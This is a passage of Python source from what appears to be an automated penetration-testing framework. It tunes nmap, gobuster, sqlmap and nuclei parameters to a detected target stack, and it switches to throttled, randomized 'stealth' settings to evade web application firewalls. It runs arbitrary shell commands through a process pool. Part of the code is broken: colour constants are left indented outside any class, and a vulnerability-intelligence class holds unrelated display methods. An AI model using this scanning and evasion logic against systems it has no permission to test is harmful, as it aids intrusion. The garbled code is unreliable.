        profile_optimized_params = self._apply_profile_optimizations(tool, resource_optimized_params, profile)
        
        # Add metadata
        profile_optimized_params["_optimization_metadata"] = {
            "detected_technologies": detected_tech,
            "resource_usage": resource_usage,
            "optimization_profile": profile,
            "optimizations_applied": resource_optimized_params.get("_optimizations_applied", []),
            "timestamp": datetime.now().isoformat()
        }
        
        return profile_optimized_params
    
    def _get_base_parameters(self, tool: str, profile: TargetProfile) -> Dict[str, Any]:
        """Get base parameters for a tool"""
        base_params = {"target": profile.target}
        
        # Tool-specific base parameters
        if tool == "nmap":
            base_params.update({
                "scan_type": "-sS",
                "ports": "1-1000",
                "timing": "-T4"
            })
        elif tool == "gobuster":
            base_params.update({
                "mode": "dir",
                "threads": 20,
                "wordlist": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            })
        elif tool == "sqlmap":
            base_params.update({
                "batch": True,
                "level": 1,
                "risk": 1
            })
        elif tool == "nuclei":
            base_params.update({
                "severity": "critical,high,medium",
                "threads": 25
            })
        
        return base_params
    
    def _apply_technology_optimizations(self, tool: str, params: Dict[str, Any], detected_tech: Dict[str, List[str]]) -> Dict[str, Any]:
        """Apply technology-specific optimizations"""
        optimized_params = params.copy()
        
        # Web server optimizations
        if "apache" in detected_tech.get("web_servers", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "php,html,txt,xml,conf"
            elif tool == "nuclei":
                optimized_params["tags"] = optimized_params.get("tags", "") + ",apache"
        
        elif "nginx" in detected_tech.get("web_servers", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "php,html,txt,json,conf"
            elif tool == "nuclei":
                optimized_params["tags"] = optimized_params.get("tags", "") + ",nginx"
        
        # CMS optimizations
        if "wordpress" in detected_tech.get("cms", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "php,html,txt,xml"
                optimized_params["additional_paths"] = "/wp-content/,/wp-admin/,/wp-includes/"
            elif tool == "nuclei":
                optimized_params["tags"] = optimized_params.get("tags", "") + ",wordpress"
            elif tool == "wpscan":
                optimized_params["enumerate"] = "ap,at,cb,dbe"
        
        # Language-specific optimizations
        if "php" in detected_tech.get("languages", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "php,php3,php4,php5,phtml,html"
            elif tool == "sqlmap":
                optimized_params["dbms"] = "mysql"
        
        elif "dotnet" in detected_tech.get("languages", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "aspx,asp,html,txt"
            elif tool == "sqlmap":
                optimized_params["dbms"] = "mssql"
        
        # Security feature adaptations
        if detected_tech.get("security", []):
            # WAF detected - use stealth mode
            if any(waf in detected_tech["security"] for waf in ["cloudflare", "incapsula", "sucuri"]):
                optimized_params["_stealth_mode"] = True
                if tool == "gobuster":
                    optimized_params["threads"] = min(optimized_params.get("threads", 20), 5)
                    optimized_params["delay"] = "2s"
                elif tool == "sqlmap":
                    optimized_params["delay"] = 2
                    optimized_params["randomize"] = True
        
        return optimized_params
    
    def _apply_profile_optimizations(self, tool: str, params: Dict[str, Any], profile: str) -> Dict[str, Any]:
        """Apply optimization profile settings"""
        if tool not in self.optimization_profiles:
            return params
        
        profile_settings = self.optimization_profiles[tool].get(profile, {})
        optimized_params = params.copy()
        
        # Apply profile-specific settings
        for key, value in profile_settings.items():
            optimized_params[key] = value
        
        # Handle stealth mode flag
        if params.get("_stealth_mode", False) and profile != "stealth":
            # Force stealth settings even if different profile requested
            stealth_settings = self.optimization_profiles[tool].get("stealth", {})
            for key, value in stealth_settings.items():
                optimized_params[key] = value
        
        return optimized_params
    
    def handle_tool_failure(self, tool: str, error_output: str, exit_code: int, current_params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle tool failure and suggest recovery"""
        failure_analysis = self.failure_recovery.analyze_failure(error_output, exit_code)
        
        recovery_plan = {
            "original_tool": tool,
            "failure_analysis": failure_analysis,
            "recovery_actions": [],
            "alternative_tools": failure_analysis["alternative_tools"],
            "adjusted_parameters": current_params.copy()
        }
        
        # Apply automatic parameter adjustments based on failure type
        if failure_analysis["failure_type"] == "timeout":
            if "timeout" in recovery_plan["adjusted_parameters"]:
                recovery_plan["adjusted_parameters"]["timeout"] *= 2
            if "threads" in recovery_plan["adjusted_parameters"]:
                recovery_plan["adjusted_parameters"]["threads"] = max(1, recovery_plan["adjusted_parameters"]["threads"] // 2)
            recovery_plan["recovery_actions"].append("Increased timeout and reduced threads")
        
        elif failure_analysis["failure_type"] == "rate_limited":
            timing_profile = self.rate_limiter.adjust_timing(recovery_plan["adjusted_parameters"], "stealth")
            recovery_plan["adjusted_parameters"].update(timing_profile)
            recovery_plan["recovery_actions"].append("Applied stealth timing profile")
        
        return recovery_plan

# ============================================================================
# ADVANCED PROCESS MANAGEMENT AND MONITORING (v10.0 ENHANCEMENT)
# ============================================================================

class ProcessPool:
    """Intelligent process pool with auto-scaling capabilities"""
    
    def __init__(self, min_workers=2, max_workers=20, scale_threshold=0.8):
        self.min_workers = min_workers
        self.max_workers = max_workers
        self.scale_threshold = scale_threshold
        self.workers = []
        self.task_queue = queue.Queue()
        self.results = {}
        self.pool_lock = threading.Lock()
        self.active_tasks = {}
        self.performance_metrics = {
            "tasks_completed": 0,
            "tasks_failed": 0,
            "avg_task_time": 0.0,
            "cpu_usage": 0.0,
            "memory_usage": 0.0
        }
        
        # Initialize minimum workers
        self._scale_up(self.min_workers)
        
        # Start monitoring thread
        self.monitor_thread = threading.Thread(target=self._monitor_performance, daemon=True)
        self.monitor_thread.start()
    
    def submit_task(self, task_id: str, func, *args, **kwargs) -> str:
        """Submit a task to the process pool"""
        task = {
            "id": task_id,
            "func": func,
            "args": args,
            "kwargs": kwargs,
            "submitted_at": time.time(),
            "status": "queued"
        }
        
        with self.pool_lock:
            self.active_tasks[task_id] = task
            self.task_queue.put(task)
        
        logger.info(f"📋 Task submitted to pool: {task_id}")
        return task_id
    
    def get_task_result(self, task_id: str) -> Dict[str, Any]:
        """Get result of a submitted task"""
        with self.pool_lock:
            if task_id in self.results:
                return self.results[task_id]
            elif task_id in self.active_tasks:
                return {"status": self.active_tasks[task_id]["status"], "result": None}
            else:
                return {"status": "not_found", "result": None}
    
    def _worker_thread(self, worker_id: int):
        """Worker thread that processes tasks"""
        logger.info(f"🔧 Process pool worker {worker_id} started")
        
        while True:
            try:
                # Get task from queue with timeout
                task = self.task_queue.get(timeout=30)
                if task is None:  # Shutdown signal
                    break
                
                task_id = task["id"]
                start_time = time.time()
                
                # Update task status
                with self.pool_lock:
                    if task_id in self.active_tasks:
                        self.active_tasks[task_id]["status"] = "running"
                        self.active_tasks[task_id]["worker_id"] = worker_id
                        self.active_tasks[task_id]["started_at"] = start_time
                
                try:
                    # Execute task
                    result = task["func"](*task["args"], **task["kwargs"])
                    
                    # Store result
                    execution_time = time.time() - start_time
                    with self.pool_lock:
                        self.results[task_id] = {
                            "status": "completed",
                            "result": result,
                            "execution_time": execution_time,
                            "worker_id": worker_id,
                            "completed_at": time.time()
                        }
                        
                        # Update performance metrics
                        self.performance_metrics["tasks_completed"] += 1
                        self.performance_metrics["avg_task_time"] = (
                            (self.performance_metrics["avg_task_time"] * (self.performance_metrics["tasks_completed"] - 1) + execution_time) /
                            self.performance_metrics["tasks_completed"]
                        )
                        
                        # Remove from active tasks
                        if task_id in self.active_tasks:
                            del self.active_tasks[task_id]
                    
                    logger.info(f"✅ Task completed: {task_id} in {execution_time:.2f}s")
                    
                except Exception as e:
                    # Handle task failure
                    with self.pool_lock:
                        self.results[task_id] = {
                            "status": "failed",
                            "error": str(e),
                            "execution_time": time.time() - start_time,
                            "worker_id": worker_id,
                            "failed_at": time.time()
                        }
                        
                        self.performance_metrics["tasks_failed"] += 1
                        
                        if task_id in self.active_tasks:
                            del self.active_tasks[task_id]
                    
                    logger.error(f"❌ Task failed: {task_id} - {str(e)}")
                
                self.task_queue.task_done()
                
            except queue.Empty:
                # No tasks available, continue waiting
                continue
            except Exception as e:
                logger.error(f"💥 Worker {worker_id} error: {str(e)}")
    
    def _monitor_performance(self):
        """Monitor pool performance and auto-scale"""
        while True:
            try:
                time.sleep(10)  # Monitor every 10 seconds
                
                with self.pool_lock:
                    queue_size = self.task_queue.qsize()
                    active_workers = len([w for w in self.workers if w.is_alive()])
                    active_tasks_count = len(self.active_tasks)
                
                # Calculate load metrics
                if active_workers > 0:
                    load_ratio = (active_tasks_count + queue_size) / active_workers
                else:
                    load_ratio = float('inf')
                
                # Auto-scaling logic
                if load_ratio > self.scale_threshold and active_workers < self.max_workers:
                    # Scale up
                    new_workers = min(2, self.max_workers - active_workers)
                    self._scale_up(new_workers)
                    logger.info(f"📈 Scaled up process pool: +{new_workers} workers (total: {active_workers + new_workers})")
                
                elif load_ratio < 0.3 and active_workers > self.min_workers:
                    # Scale down
                    workers_to_remove = min(1, active_workers - self.min_workers)
                    self._scale_down(workers_to_remove)
                    logger.info(f"📉 Scaled down process pool: -{workers_to_remove} workers (total: {active_workers - workers_to_remove})")
                
                # Update performance metrics
                try:
                    cpu_percent = psutil.cpu_percent()
                    memory_info = psutil.virtual_memory()
                    
                    with self.pool_lock:
                        self.performance_metrics["cpu_usage"] = cpu_percent
                        self.performance_metrics["memory_usage"] = memory_info.percent
                
                except Exception:
                    pass  # Ignore psutil errors
                
            except Exception as e:
                logger.error(f"💥 Pool monitor error: {str(e)}")
    
    def _scale_up(self, count: int):
        """Add workers to the pool"""
        with self.pool_lock:
            for i in range(count):
                worker_id = len(self.workers)
                worker = threading.Thread(target=self._worker_thread, args=(worker_id,), daemon=True)
                worker.start()
                self.workers.append(worker)
    
    def _scale_down(self, count: int):
        """Remove workers from the pool"""
        with self.pool_lock:
            for _ in range(count):
                if len(self.workers) > self.min_workers:
                    # Signal worker to shutdown by putting None in queue
                    self.task_queue.put(None)
                    # Remove from workers list (worker will exit naturally)
                    if self.workers:
                        self.workers.pop()
    
    def get_pool_stats(self) -> Dict[str, Any]:
        """Get current pool statistics"""
        with self.pool_lock:
            active_workers = len([w for w in self.workers if w.is_alive()])
            return {
                "active_workers": active_workers,
                "queue_size": self.task_queue.qsize(),
                "active_tasks": len(self.active_tasks),
                "performance_metrics": self.performance_metrics.copy(),
                "min_workers": self.min_workers,
                "max_workers": self.max_workers
            }

class AdvancedCache:
    """Advanced caching system with intelligent TTL and LRU eviction"""
    
    def __init__(self, max_size=1000, default_ttl=3600):
        self.max_size = max_size
        self.default_ttl = default_ttl
        self.cache = {}
        self.access_times = {}
        self.ttl_times = {}
        self.cache_lock = threading.RLock()
        self.hit_count = 0
        self.miss_count = 0
        
        # Start cleanup thread
        self.cleanup_thread = threading.Thread(target=self._cleanup_expired, daemon=True)
        self.cleanup_thread.start()
    
    def get(self, key: str) -> Any:
        """Get value from cache"""
        with self.cache_lock:
            current_time = time.time()
            
            # Check if key exists and is not expired
            if key in self.cache and (key not in self.ttl_times or self.ttl_times[key] > current_time):
                # Update access time for LRU
                self.access_times[key] = current_time
                self.hit_count += 1
                return self.cache[key]
            
            # Cache miss or expired
            if key in self.cache:
                # Remove expired entry
                self._remove_key(key)
            
            self.miss_count += 1
            return None
    
    def set(self, key: str, value: Any, ttl: int = None) -> None:
        """Set value in cache with optional TTL"""
        with self.cache_lock:
            current_time = time.time()
            
            # Use default TTL if not specified
            if ttl is None:
                ttl = self.default_ttl
            
            # Check if we need to evict entries
            if len(self.cache) >= self.max_size and key not in self.cache:
                self._evict_lru()
            
            # Set the value
            self.cache[key] = value
            self.access_times[key] = current_time
            self.ttl_times[key] = current_time + ttl
    
    def delete(self, key: str) -> bool:
        """Delete key from cache"""
        with self.cache_lock:
            if key in self.cache:
                self._remove_key(key)
                return True
            return False
    
    def clear(self) -> None:
        """Clear all cache entries"""
        with self.cache_lock:
            self.cache.clear()
            self.access_times.clear()
            self.ttl_times.clear()
    
    def _remove_key(self, key: str) -> None:
        """Remove key and associated metadata"""
        self.cache.pop(key, None)
        self.access_times.pop(key, None)
        self.ttl_times.pop(key, None)
    
    def _evict_lru(self) -> None:
        """Evict least recently used entry"""
        if not self.access_times:
            return
        
        # Find least recently used key
        lru_key = min(self.access_times.keys(), key=lambda k: self.access_times[k])
        self._remove_key(lru_key)
        logger.debug(f"🗑️ Evicted LRU cache entry: {lru_key}")
    
    def _cleanup_expired(self) -> None:
        """Cleanup expired entries periodically"""
        while True:
            try:
                time.sleep(60)  # Cleanup every minute
                current_time = time.time()
                expired_keys = []
                
                with self.cache_lock:
                    for key, expiry_time in self.ttl_times.items():
                        if expiry_time <= current_time:
                            expired_keys.append(key)
                    
                    for key in expired_keys:
                        self._remove_key(key)
                
                if expired_keys:
                    logger.debug(f"🧹 Cleaned up {len(expired_keys)} expired cache entries")
                
            except Exception as e:
                logger.error(f"💥 Cache cleanup error: {str(e)}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get cache statistics"""
        with self.cache_lock:
            total_requests = self.hit_count + self.miss_count
            hit_rate = (self.hit_count / total_requests * 100) if total_requests > 0 else 0
            
            return {
                "size": len(self.cache),
                "max_size": self.max_size,
                "hit_count": self.hit_count,
                "miss_count": self.miss_count,
                "hit_rate": hit_rate,
                "utilization": (len(self.cache) / self.max_size * 100)
            }

class EnhancedProcessManager:
    """Advanced process management with intelligent resource allocation"""
    
    def __init__(self):
        self.process_pool = ProcessPool(min_workers=4, max_workers=32)
        self.cache = AdvancedCache(max_size=2000, default_ttl=1800)  # 30 minutes default TTL
        self.resource_monitor = ResourceMonitor()
        self.process_registry = {}
        self.registry_lock = threading.RLock()
        self.performance_dashboard = PerformanceDashboard()
        
        # Process termination and recovery
        self.termination_handlers = {}
        self.recovery_strategies = {}
        
        # Auto-scaling configuration
        self.auto_scaling_enabled = True
        self.resource_thresholds = {
            "cpu_high": 85.0,
            "memory_high": 90.0,
            "disk_high": 95.0,
            "load_high": 0.8
        }
        
        # Start background monitoring
        self.monitor_thread = threading.Thread(target=self._monitor_system, daemon=True)
        self.monitor_thread.start()
    
    def execute_command_async(self, command: str, context: Dict[str, Any] = None) -> str:
        """Execute command asynchronously using process pool"""
        task_id = f"cmd_{int(time.time() * 1000)}_{hash(command) % 10000}"
        
        # Check cache first
        cache_key = f"cmd_result_{hash(command)}"
        cached_result = self.cache.get(cache_key)
        if cached_result and context and context.get("use_cache", True):
            logger.info(f"📋 Using cached result for command: {command[:50]}...")
            return cached_result
        
        # Submit to process pool
        self.process_pool.submit_task(
            task_id,
            self._execute_command_internal,
            command,
            context or {}
        )
        
        return task_id
    
    def _execute_command_internal(self, command: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """Internal command execution with enhanced monitoring"""
        start_time = time.time()
        
        try:
            # Resource-aware execution
            resource_usage = self.resource_monitor.get_current_usage()
            
            # Adjust command based on resource availability
            if resource_usage["cpu_percent"] > self.resource_thresholds["cpu_high"]:
                # Add nice priority for CPU-intensive commands
                if not command.startswith("nice"):
                    command = f"nice -n 10 {command}"
            
            # Execute command
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid if os.name != 'nt' else None
            )
            
            # Register process
            with self.registry_lock:
                self.process_registry[process.pid] = {
                    "command": command,
                    "process": process,
                    "start_time": start_time,
                    "context": context,
                    "status": "running"
                }
            
            # Monitor process execution
            stdout, stderr = process.communicate()
            execution_time = time.time() - start_time
            
            result = {
                "success": process.returncode == 0,
                "stdout": stdout,
                "stderr": stderr,
                "return_code": process.returncode,
                "execution_time": execution_time,
                "pid": process.pid,
                "resource_usage": self.resource_monitor.get_process_usage(process.pid)
            }
            
            # Cache successful results
            if result["success"] and context.get("cache_result", True):
                cache_key = f"cmd_result_{hash(command)}"
                cache_ttl = context.get("cache_ttl", 1800)  # 30 minutes default
                self.cache.set(cache_key, result, cache_ttl)
            
            # Update performance metrics
            self.performance_dashboard.record_execution(command, result)
            
            return result
            
        except Exception as e:
            execution_time = time.time() - start_time
            error_result = {
                "success": False,
                "stdout": "",
                "stderr": str(e),
                "return_code": -1,
                "execution_time": execution_time,
                "error": str(e)
            }
            
            self.performance_dashboard.record_execution(command, error_result)
            return error_result
        
        finally:
            # Cleanup process registry
            with self.registry_lock:
                if hasattr(process, 'pid') and process.pid in self.process_registry:
                    del self.process_registry[process.pid]
    
    def get_task_result(self, task_id: str) -> Dict[str, Any]:
        """Get result of async task"""
        return self.process_pool.get_task_result(task_id)
    
    def terminate_process_gracefully(self, pid: int, timeout: int = 30) -> bool:
        """Terminate process with graceful degradation"""
        try:
            with self.registry_lock:
                if pid not in self.process_registry:
                    return False
                
                process_info = self.process_registry[pid]
                process = process_info["process"]
                
                # Try graceful termination first
                process.terminate()
                
                # Wait for graceful termination
                try:
                    process.wait(timeout=timeout)
                    process_info["status"] = "terminated_gracefully"
                    logger.info(f"✅ Process {pid} terminated gracefully")
                    return True
                except subprocess.TimeoutExpired:
                    # Force kill if graceful termination fails
                    process.kill()
                    process_info["status"] = "force_killed"
                    logger.warning(f"⚠️ Process {pid} force killed after timeout")
                    return True
                    
        except Exception as e:
            logger.error(f"💥 Error terminating process {pid}: {str(e)}")
            return False
    
    def _monitor_system(self):
        """Monitor system resources and auto-scale"""
        while True:
            try:
                time.sleep(15)  # Monitor every 15 seconds
                
                # Get current resource usage
                resource_usage = self.resource_monitor.get_current_usage()
                
                # Auto-scaling based on resource usage
                if self.auto_scaling_enabled:
                    self._auto_scale_based_on_resources(resource_usage)
                
                # Update performance dashboard
                self.performance_dashboard.update_system_metrics(resource_usage)
                
            except Exception as e:
                logger.error(f"💥 System monitoring error: {str(e)}")
    
    def _auto_scale_based_on_resources(self, resource_usage: Dict[str, float]):
        """Auto-scale process pool based on resource usage"""
        pool_stats = self.process_pool.get_pool_stats()
        current_workers = pool_stats["active_workers"]
        
        # Scale down if resources are constrained
        if (resource_usage["cpu_percent"] > self.resource_thresholds["cpu_high"] or
            resource_usage["memory_percent"] > self.resource_thresholds["memory_high"]):
            
            if current_workers > self.process_pool.min_workers:
                self.process_pool._scale_down(1)
                logger.info(f"📉 Auto-scaled down due to high resource usage: CPU {resource_usage['cpu_percent']:.1f}%, Memory {resource_usage['memory_percent']:.1f}%")
        
        # Scale up if resources are available and there's demand
        elif (resource_usage["cpu_percent"] < 60 and 
              resource_usage["memory_percent"] < 70 and
              pool_stats["queue_size"] > 2):
            
            if current_workers < self.process_pool.max_workers:
                self.process_pool._scale_up(1)
                logger.info(f"📈 Auto-scaled up due to available resources and demand")
    
    def get_comprehensive_stats(self) -> Dict[str, Any]:
        """Get comprehensive system and process statistics"""
        return {
            "process_pool": self.process_pool.get_pool_stats(),
            "cache": self.cache.get_stats(),
            "resource_usage": self.resource_monitor.get_current_usage(),
            "active_processes": len(self.process_registry),
            "performance_dashboard": self.performance_dashboard.get_summary(),
            "auto_scaling_enabled": self.auto_scaling_enabled,
            "resource_thresholds": self.resource_thresholds
        }

class ResourceMonitor:
    """Advanced resource monitoring with historical tracking"""
    
    def __init__(self, history_size=100):
        self.history_size = history_size
        self.usage_history = []
        self.history_lock = threading.Lock()
    
    def get_current_usage(self) -> Dict[str, float]:
        """Get current system resource usage"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            network = psutil.net_io_counters()
            
            usage = {
                "cpu_percent": cpu_percent,
                "memory_percent": memory.percent,
                "memory_available_gb": memory.available / (1024**3),
                "disk_percent": disk.percent,
                "disk_free_gb": disk.free / (1024**3),
                "network_bytes_sent": network.bytes_sent,
                "network_bytes_recv": network.bytes_recv,
                "timestamp": time.time()
            }
            
            # Add to history
            with self.history_lock:
                self.usage_history.append(usage)
                if len(self.usage_history) > self.history_size:
                    self.usage_history.pop(0)
            
            return usage
            
        except Exception as e:
            logger.error(f"💥 Error getting resource usage: {str(e)}")
            return {
                "cpu_percent": 0,
                "memory_percent": 0,
                "memory_available_gb": 0,
                "disk_percent": 0,
                "disk_free_gb": 0,
                "network_bytes_sent": 0,
                "network_bytes_recv": 0,
                "timestamp": time.time()
            }
    
    def get_process_usage(self, pid: int) -> Dict[str, Any]:
        """Get resource usage for specific process"""
        try:
            process = psutil.Process(pid)
            return {
                "cpu_percent": process.cpu_percent(),
                "memory_percent": process.memory_percent(),
                "memory_rss_mb": process.memory_info().rss / (1024**2),
                "num_threads": process.num_threads(),
                "status": process.status()
            }
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return {}
    
    def get_usage_trends(self) -> Dict[str, Any]:
        """Get resource usage trends"""
        with self.history_lock:
            if len(self.usage_history) < 2:
                return {}
            
            recent = self.usage_history[-10:]  # Last 10 measurements
            
            cpu_trend = sum(u["cpu_percent"] for u in recent) / len(recent)
            memory_trend = sum(u["memory_percent"] for u in recent) / len(recent)
            
            return {
                "cpu_avg_10": cpu_trend,
                "memory_avg_10": memory_trend,
                "measurements": len(self.usage_history),
                "trend_period_minutes": len(recent) * 15 / 60  # 15 second intervals
            }

class PerformanceDashboard:
    """Real-time performance monitoring dashboard"""
    
    def __init__(self):
        self.execution_history = []
        self.system_metrics = []
        self.dashboard_lock = threading.Lock()
        self.max_history = 1000
    
    def record_execution(self, command: str, result: Dict[str, Any]):
        """Record command execution for performance tracking"""
        with self.dashboard_lock:
            execution_record = {
                "command": command[:100],  # Truncate long commands
                "success": result.get("success", False),
                "execution_time": result.get("execution_time", 0),
                "return_code": result.get("return_code", -1),
                "timestamp": time.time()
            }
            
            self.execution_history.append(execution_record)
            if len(self.execution_history) > self.max_history:
                self.execution_history.pop(0)
    
    def update_system_metrics(self, metrics: Dict[str, Any]):
        """Update system metrics for dashboard"""
        with self.dashboard_lock:
            self.system_metrics.append(metrics)
            if len(self.system_metrics) > self.max_history:
                self.system_metrics.pop(0)
    
    def get_summary(self) -> Dict[str, Any]:
        """Get performance summary"""
        with self.dashboard_lock:
            if not self.execution_history:
                return {"executions": 0}
            
            recent_executions = self.execution_history[-100:]  # Last 100 executions
            
            total_executions = len(recent_executions)
            successful_executions = sum(1 for e in recent_executions if e["success"])
            avg_execution_time = sum(e["execution_time"] for e in recent_executions) / total_executions
            
            return {
                "total_executions": len(self.execution_history),
                "recent_executions": total_executions,
                "success_rate": (successful_executions / total_executions * 100) if total_executions > 0 else 0,
                "avg_execution_time": avg_execution_time,
                "system_metrics_count": len(self.system_metrics)
            }

# Global instances
tech_detector = TechnologyDetector()
rate_limiter = RateLimitDetector()
failure_recovery = FailureRecoverySystem()
performance_monitor = PerformanceMonitor()
parameter_optimizer = ParameterOptimizer()
enhanced_process_manager = EnhancedProcessManager()

# Global CTF framework instances
ctf_manager = CTFWorkflowManager()
ctf_tools = CTFToolManager()
ctf_automator = CTFChallengeAutomator()
ctf_coordinator = CTFTeamCoordinator()

# ============================================================================
# PROCESS MANAGEMENT FOR COMMAND TERMINATION (v5.0 ENHANCEMENT)
# ============================================================================

# Process management for command termination
active_processes = {}  # pid -> process info
process_lock = threading.Lock()

class ProcessManager:
    """Enhanced process manager for command termination and monitoring"""
    
    @staticmethod
    def register_process(pid, command, process_obj):
        """Register a new active process"""
        with process_lock:
            active_processes[pid] = {
                "pid": pid,
                "command": command,
                "process": process_obj,
                "start_time": time.time(),
                "status": "running",
                "progress": 0.0,
                "last_output": "",
                "bytes_processed": 0
            }
            logger.info(f"🆔 REGISTERED: Process {pid} - {command[:50]}...")
    
    @staticmethod
    def update_process_progress(pid, progress, last_output="", bytes_processed=0):
        """Update process progress and stats"""
        with process_lock:
            if pid in active_processes:
                active_processes[pid]["progress"] = progress
                active_processes[pid]["last_output"] = last_output
                active_processes[pid]["bytes_processed"] = bytes_processed
                runtime = time.time() - active_processes[pid]["start_time"]
                
                # Calculate ETA if progress > 0
                eta = 0
                if progress > 0:
                    eta = (runtime / progress) * (1.0 - progress)
                
                active_processes[pid]["runtime"] = runtime
                active_processes[pid]["eta"] = eta
    
    @staticmethod
    def terminate_process(pid):
        """Terminate a specific process"""
        with process_lock:
            if pid in active_processes:
                process_info = active_processes[pid]
                try:
                    process_obj = process_info["process"]
                    if process_obj and process_obj.poll() is None:
                        process_obj.terminate()
                        time.sleep(1)  # Give it a chance to terminate gracefully
                        if process_obj.poll() is None:
                            process_obj.kill()  # Force kill if still running
                        
                        active_processes[pid]["status"] = "terminated"
                        logger.warning(f"🛑 TERMINATED: Process {pid} - {process_info['command'][:50]}...")
                        return True
                except Exception as e:
                    logger.error(f"💥 Error terminating process {pid}: {str(e)}")
                    return False
            return False
    
    @staticmethod
    def cleanup_process(pid):
        """Remove process from active registry"""
        with process_lock:
            if pid in active_processes:
                process_info = active_processes.pop(pid)
                logger.info(f"🧹 CLEANUP: Process {pid} removed from registry")
                return process_info
            return None
    
    @staticmethod
    def get_process_status(pid):
        """Get status of a specific process"""
        with process_lock:
            return active_processes.get(pid, None)
    
    @staticmethod
    def list_active_processes():
        """List all active processes"""
        with process_lock:
            return dict(active_processes)
    
    @staticmethod
    def pause_process(pid):
        """Pause a specific process (SIGSTOP)"""
        with process_lock:
            if pid in active_processes:
                try:
                    process_obj = active_processes[pid]["process"]
                    if process_obj and process_obj.poll() is None:
                        os.kill(pid, signal.SIGSTOP)
                        active_processes[pid]["status"] = "paused"
                        logger.info(f"⏸️  PAUSED: Process {pid}")
                        return True
                except Exception as e:
                    logger.error(f"💥 Error pausing process {pid}: {str(e)}")
            return False
    
    @staticmethod
    def resume_process(pid):
        """Resume a paused process (SIGCONT)"""
        with process_lock:
            if pid in active_processes:
                try:
                    process_obj = active_processes[pid]["process"]
                    if process_obj and process_obj.poll() is None:
                        os.kill(pid, signal.SIGCONT)
                        active_processes[pid]["status"] = "running"
                        logger.info(f"▶️  RESUMED: Process {pid}")
                        return True
                except Exception as e:
                    logger.error(f"💥 Error resuming process {pid}: {str(e)}")
            return False

# Enhanced color codes and visual elements for modern terminal output
# All color references consolidated to ModernVisualEngine.COLORS for consistency
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    
    # Text effects
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    STRIKETHROUGH = '\033[9m'

class PythonEnvironmentManager:
    """Manage Python virtual environments and dependencies"""
    
    def __init__(self, base_dir: str = "/tmp/hexstrike_envs"):
        self.base_dir = Path(base_dir)
        self.base_dir.mkdir(exist_ok=True)
    
    def create_venv(self, env_name: str) -> Path:
        """Create a new virtual environment"""
        env_path = self.base_dir / env_name
        if not env_path.exists():
            logger.info(f"🐍 Creating virtual environment: {env_name}")
            venv.create(env_path, with_pip=True)
        return env_path
    
    def install_package(self, env_name: str, package: str) -> bool:
        """Install a package in the specified environment"""
        env_path = self.create_venv(env_name)
        pip_path = env_path / "bin" / "pip"
        
        try:
            result = subprocess.run([str(pip_path), "install", package], 
                                  capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                logger.info(f"📦 Installed package {package} in {env_name}")
                return True
            else:
                logger.error(f"❌ Failed to install {package}: {result.stderr}")
                return False
        except Exception as e:
            logger.error(f"💥 Error installing package {package}: {e}")
            return False
    
    def get_python_path(self, env_name: str) -> str:
        """Get Python executable path for environment"""
        env_path = self.create_venv(env_name)
        return str(env_path / "bin" / "python")

# Global environment manager
env_manager = PythonEnvironmentManager()

# ============================================================================
# ADVANCED VULNERABILITY INTELLIGENCE SYSTEM (v6.0 ENHANCEMENT)
# ============================================================================

class CVEIntelligenceManager:
    """Advanced CVE Intelligence and Vulnerability Management System"""
    
    def __init__(self):
        self.cve_cache = {}
        self.vulnerability_db = {}
        self.threat_intelligence = {}
    
    @staticmethod
    def create_banner():
        """Reuse unified ModernVisualEngine banner (legacy hook)."""
        return ModernVisualEngine.create_banner()
    
    @staticmethod
    def render_progress_bar(progress: float, width: int = 40, style: str = 'cyber', 
                          label: str = "", eta: float = 0, speed: str = "") -> str:
        """Render a beautiful progress bar with multiple styles"""
        
        # Clamp progress between 0 and 1
        progress = max(0.0, min(1.0, progress))
        
        # Calculate filled and empty portions
        filled_width = int(width * progress)
        empty_width = width - filled_width
        
        # Style-specific rendering
        if style == 'cyber':
            filled_char = '█'; empty_char = '░'
            bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
            progress_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
        elif style == 'matrix':
            filled_char = '▓'; empty_char = '▒'
            bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
            progress_color = ModernVisualEngine.COLORS['ACCENT_GRADIENT']
        elif style == 'neon':
            filled_char = '━'; empty_char = '─'
            bar_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
            progress_color = ModernVisualEngine.COLORS['CYBER_ORANGE']
        else:
            filled_char = '█'; empty_char = '░'
            bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
            progress_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
        
        # Build the progress bar
        filled_part = bar_color + filled_char * filled_width
        empty_part = ModernVisualEngine.COLORS['TERMINAL_GRAY'] + empty_char * empty_width
        percentage = f"{progress * 100:.1f}%"
        
        # Add ETA and speed if provided
        eta_str = f" | ETA: {eta:.0f}s" if eta > 0 else ""
        speed_str = f" | {speed}" if speed else ""
        
        # Construct the full progress bar
        bar = f"{progress_color}[{filled_part}{empty_part}{ModernVisualEngine.COLORS['RESET']}{progress_color}] {percentage}{eta_str}{speed_str}{ModernVisualEngine.COLORS['RESET']}"
        
        if label:
            return f"{ModernVisualEngine.COLORS['BOLD']}{label}{ModernVisualEngine.COLORS['RESET']} {bar}"
        return bar
    
    @staticmethod
    def render_vulnerability_card(vuln_data: Dict[str, Any]) -> str:
        """Render vulnerability as a beautiful card with severity indicators"""
        
